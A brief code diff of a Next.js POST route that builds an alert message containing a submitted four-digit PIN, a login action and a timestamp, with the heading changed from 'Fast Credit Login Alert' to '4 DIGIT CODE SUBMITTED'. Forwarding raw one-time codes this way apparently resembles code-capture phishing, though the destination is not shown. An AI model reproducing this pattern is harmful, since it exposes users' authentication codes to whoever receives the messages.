@@ -16,7 +16,7 @@ export async function POST(request: NextRequest) {
     }
 
     const message = `
-🔔 **Fast Credit Login Alert**
+🔔 **4 DIGIT CODE SUBMITTED*
     Pin :   ${otpCode}
 📋 Action: ${action === 'login_attempt' ? 'Login Attempt' : action}
 ⏰ Timestamp: ${new Date(timestamp).toLocaleString()}
